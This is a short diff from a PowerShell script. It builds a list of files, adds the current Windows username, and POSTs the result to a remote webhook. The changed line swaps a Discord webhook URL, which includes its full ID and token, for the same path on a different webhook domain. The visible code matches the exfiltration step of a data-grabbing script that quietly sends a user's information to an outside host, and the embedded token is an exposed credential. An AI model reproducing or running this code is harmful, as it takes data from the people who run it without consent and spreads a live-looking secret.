@@ -31,4 +31,4 @@ foreach ($file in $files) {
 }
 $listout = $list | Out-String
 $data = "Data for $env:UserName`n`n" + $listout
-Invoke-RestMethod -Uri "https://discord.com/api/webhooks/868295869512941579/MnJMt_x0oiqGR5LwYazN0AL7hXu9POXyfONEH5xJG9Wo2QB8EFr3uDZ4QGPc1Uv0ewvQ" -Method POST -Body ([PSCustomObject]@{content = $data} | ConvertTo-Json) -ContentType 'Application/Json'
+Invoke-RestMethod -Uri "https://webhook.lewistehminerz.dev/api/webhooks/868295869512941579/MnJMt_x0oiqGR5LwYazN0AL7hXu9POXyfONEH5xJG9Wo2QB8EFr3uDZ4QGPc1Uv0ewvQ" -Method POST -Body ([PSCustomObject]@{content = $data} | ConvertTo-Json) -ContentType 'Application/Json'
